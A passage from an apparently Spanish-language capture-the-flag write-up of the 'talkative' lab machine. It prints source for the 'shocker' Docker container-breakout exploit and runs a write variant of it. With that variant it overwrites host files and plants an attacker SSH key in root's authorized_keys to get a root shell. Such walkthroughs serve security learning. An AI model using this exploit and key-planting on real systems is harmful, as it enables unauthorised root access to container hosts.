</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[*] Brute forcing remaining 32bit. This can take a while...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (de) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">uint32_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xffffffff</span>; <span style="color:#f92672">++</span>i) {
</span></span><span style="display:flex;"><span>      outh.handle_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>      outh.handle_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memcpy</span>(outh.f_handle, <span style="color:#f92672">&amp;</span> ino, <span style="color:#66d9ef">sizeof</span>(ino));
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memcpy</span>(outh.f_handle <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, <span style="color:#f92672">&amp;</span> i, <span style="color:#66d9ef">sizeof</span>(i));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((i <span style="color:#f92672">%</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">20</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[*] (%s) Trying: 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, de <span style="color:#f92672">-&gt;</span> d_name, i);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">open_by_handle_at</span>(bfd, (<span style="color:#66d9ef">struct</span> file_handle <span style="color:#f92672">*</span> ) <span style="color:#f92672">&amp;</span> outh, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">closedir</span>(dir);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dump_handle</span>( <span style="color:#f92672">&amp;</span> outh);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">find_handle</span>(bfd, path, <span style="color:#f92672">&amp;</span> outh, oh);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">closedir</span>(dir);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> argv[]) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x1000</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> fd1, fd2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> my_file_handle h;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> my_file_handle root_h <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    .handle_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>,
</span></span><span style="display:flex;"><span>    .handle_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    .f_handle <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0x02</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  };
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[***] docker VMM-container breakout Po(C) 2014 [***]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;[***] The tea from the 90&#39;s kicks your sekurity again. [***]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;[***] If you have pending sec consulting, I&#39;ll happily [***]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;[***] forward to my friends who drink secury-tea too! [***]</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;enter&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// get a FS reference from something mounted in from outside
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ((fd1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/etc/hostname&#34;</span>, O_RDONLY)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;[-] open&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">find_handle</span>(fd1, argv[<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span> root_h, <span style="color:#f92672">&amp;</span> h) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;[-] Cannot find valid handle!&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[!] Got a final handle!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">dump_handle</span>( <span style="color:#f92672">&amp;</span> h);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((fd2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open_by_handle_at</span>(fd1, (<span style="color:#66d9ef">struct</span> file_handle <span style="color:#f92672">*</span> ) <span style="color:#f92672">&amp;</span> h, O_RDWR)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;[-] open_by_handle&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> line <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span> fptr;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ssize_t</span> read;
</span></span><span style="display:flex;"><span>  fptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ((read <span style="color:#f92672">=</span> <span style="color:#a6e22e">getline</span>( <span style="color:#f92672">&amp;</span> line, <span style="color:#f92672">&amp;</span> len, fptr)) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(fd2, line, read);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Success!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">close</span>(fd2);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">close</span>(fd1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Lo que voy a realizar es ver el archivo <code>/etc/sudoers</code> aprovechando esta vulnerabilidad.</p>
<p>Y editar al usuario <code>saul</code> para que tenga permisos para ejecutar como <code>root</code> cualquier comando. Luego, con el script modificado, intentaré escribir el <code>/etc/sudoers</code> y si lo consigo, debería de cerrar sesión en el SSH, iniciar sesión de nuevo y hacer un <code>sudo su</code> como el usuario <code>saul</code> y convertirme en <code>root</code></p>
<p>Primero compilamos <code>shocker.c</code> para leer el archivo <code>/etc/sudoers</code>
<img src="images/Screenshot_30.png" alt="Write-up Image"></p>
<p>Y al ejecutarlo podemos leerlo</p>
<pre tabindex="0"><code>#
# This file MUST be edited with the &#39;visudo&#39; command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path=&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&#34;

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on &#34;#include&#34; directives:

#includedir /etc/sudoers.d
</code></pre><p><img src="images/Screenshot_31.png" alt="Write-up Image"></p>
<p>Ahora agregamos al usuario <code>saul</code> para que pueda ejecutar cualquier comando como cualquier usuario..
<img src="images/Screenshot_32.png" alt="Write-up Image"></p>
<p>Ahora compilamos el script <code>shocker_write.c</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gcc -Wall -std<span style="color:#f92672">=</span>c99 -O2 shocker_write.c -static -o shocker_write
</span></span></code></pre></div><p>Subimos tanto el <code>sudoers</code> como el binario <code>shocker_write</code> ya compilado</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>local<span style="color:#f92672">)</span> pwncat$ upload sudoers /tmp/sudoers
</span></span><span style="display:flex;"><span>/tmp/sudoers ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 778/778 bytes • ? • 0:00:00
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:33:36<span style="color:#f92672">]</span> uploaded 778.00B in 0.68 seconds                                   upload.py:76
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>local<span style="color:#f92672">)</span> pwncat$ upload shocker_write /tmp/shocker_write
</span></span><span style="display:flex;"><span>/tmp/shocker_write ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 17.1/17.1 KB • ? • 0:00:00
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:34:24<span style="color:#f92672">]</span> uploaded 17.06KiB in 0.59 seconds
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@c150397ccd63:/tmp# ./shocker_write /etc/sudoers sudoers
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found bash_completion.d
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found apt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found services
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found udev
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ltrace.conf
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found selinux
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found multipath
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found udisks2
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found sensors3.conf
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found sudoers
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Match: sudoers ino<span style="color:#f92672">=</span><span style="color:#ae81ff">393977</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Brute forcing remaining 32bit. This can take a <span style="color:#66d9ef">while</span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>sudoers<span style="color:#f92672">)</span> Trying: 0x00000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0xf9, 0x02, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Got a final handle!
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0xf9, 0x02, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> open_by_handle: Permission denied
</span></span></code></pre></div><p>Vaya&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>saul@talkative:~$ sudo su
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> saul: 
</span></span><span style="display:flex;"><span>saul is not in the sudoers file.  This incident will be reported.
</span></span></code></pre></div><p>Sin embargo, si intentamos modificar otro archivo como el <code>/etc/hostname</code> por probar&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@c150397ccd63:/tmp# ./shocker_write /etc/hostname test
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0x8a, 0x6e, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span>Success!!
</span></span></code></pre></div><p>Vemos que funciona.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>saul@talkative:~$ cat /etc/hostname
</span></span><span style="display:flex;"><span>test
</span></span><span style="display:flex;"><span>tive
</span></span></code></pre></div><p>Alternativamente, podemos intentar escribir al archivo <code>/root/.ssh/authorized_keys</code> mi clave publica de atacante, y pasarme la clave privada la consola que tenemos como <code>saul</code> en la máquina víctima, para a través de ahí conectarme por SSH utilizando mi clave privada.</p>
<p>Cogemos mi clave pública <code>id_rsa.pub</code> y la copiamos a la máquina víctima al archivo <code>authorized_keys</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@c150397ccd63:/tmp# echo <span style="color:#e6db74">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCs/aNkke9LIHvwrIqFLiLavlSa5gVzvG6EibfhsRDbRY0DLzVMaWw2TmVJ/sjcWBg7DqGFJaJ70cqh7rCX9WYQnUTQUoo2yQ4yRG6UxDOEzD6Yt2JbxEZdsZqX7S1NY33zv9vtI26rLzcMLvLgjux8+dp+cuHqt3ZnBTcH....... pointedsec@parrot&#34;</span> &gt; authorized_keys
</span></span></code></pre></div><p>Y ahora ejecutamos el exploit, y&hellip; ¡esto tiene mejor pinta!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@c150397ccd63:/tmp# ./shocker_write /root/.ssh/authorized_keys authorized_keys 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>***<span style="color:#f92672">]</span> docker VMM-container breakout Po<span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2014</span> <span style="color:#f92672">[</span>***<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>***<span style="color:#f92672">]</span> The tea from the 90<span style="color:#e6db74">&#39;s kicks your sekurity again. [***]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[***] If you have pending sec consulting, I&#39;</span>ll happily <span style="color:#f92672">[</span>***<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>***<span style="color:#f92672">]</span> forward to my friends who drink secury-tea too! <span style="color:#f92672">[</span>***<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;enter&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resolving <span style="color:#e6db74">&#39;root/.ssh/authorized_keys&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found lib32
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ..
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found lost+found
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found sbin
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found bin
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found boot
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found dev
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found run
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found lib64
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found var
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found home
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found media
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found proc
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found etc
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found lib
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found libx32
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found cdrom
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found root
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Match: root ino<span style="color:#f92672">=</span><span style="color:#ae81ff">18</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Brute forcing remaining 32bit. This can take a <span style="color:#66d9ef">while</span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> Trying: 0x00000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resolving <span style="color:#e6db74">&#39;.ssh/authorized_keys&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ..
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .backup
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .config
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .cache
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .local
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .ssh
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Match: .ssh ino<span style="color:#f92672">=</span><span style="color:#ae81ff">9718</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Brute forcing remaining 32bit. This can take a <span style="color:#66d9ef">while</span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>.ssh<span style="color:#f92672">)</span> Trying: 0x00000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0xf6, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resolving <span style="color:#e6db74">&#39;authorized_keys&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ..
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found id_rsa.pub
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found known_hosts
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found authorized_keys
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Match: authorized_keys ino<span style="color:#f92672">=</span><span style="color:#ae81ff">9720</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Brute forcing remaining 32bit. This can take a <span style="color:#66d9ef">while</span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>authorized_keys<span style="color:#f92672">)</span> Trying: 0x00000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0xf8, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Got a final handle!
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0xf8, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span>Success!!
</span></span></code></pre></div><p>Ahora nos compartimos nuestra clave privada de atacante <code>(id_rsa)</code> a la máquina víctima, donde teníamos la sesión con el usuario <code>saul</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ scp id_rsa saul@127.0.0.1:/tmp/id_rsa
</span></span><span style="display:flex;"><span>saul@127.0.0.1<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
</span></span><span style="display:flex;"><span>id_rsa                                                  100% <span style="color:#ae81ff">2602</span>    56.9KB/s   00:00
</span></span></code></pre></div><p>Ahora podemos asignar permisos permisos a esta clave privada y utilizando la autenticación por clave asimétrica e intentar iniciar sesión como <code>root</code> en el equipo local (que es la máquina víctima ya que estamos en la sesión SSH con el usuario <code>saul</code>)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>saul@talkative:/tmp$ chmod <span style="color:#ae81ff">600</span> id_rsa 
</span></span><span style="display:flex;"><span>saul@talkative:/tmp$ ssh -i id_rsa root@127.0.0.1
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-81-generic x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System information as of Tue <span style="color:#ae81ff">06</span> Aug <span style="color:#ae81ff">2024</span> 07:53:16 PM UTC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System load:                      0.0
</span></span><span style="display:flex;"><span>  Usage of /:                       73.4% of 8.80GB
</span></span><span style="display:flex;"><span>  Memory usage:                     70%
</span></span><span style="display:flex;"><span>  Swap usage:                       29%
</span></span><span style="display:flex;"><span>  Processes:                        <span style="color:#ae81ff">452</span>
</span></span><span style="display:flex;"><span>  Users logged in:                  <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> br-ea74c394a147: 172.18.0.1
</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> docker0:         172.17.0.1
</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> eth0:            10.129.222.158
</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> eth0:            dead:beef::250:56ff:fe94:f20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">=</span>&gt; There are <span style="color:#ae81ff">43</span> zombie processes.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">18</span> updates can be applied immediately.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8</span> of these updates are standard security updates.
</span></span><span style="display:flex;"><span>To see these additional updates run: apt list --upgradable
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Tue Aug  <span style="color:#ae81ff">6</span> 19:48:56 <span style="color:#ae81ff">2024</span> from 127.0.0.1
</span></span><span style="display:flex;"><span>root@talkative:~# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
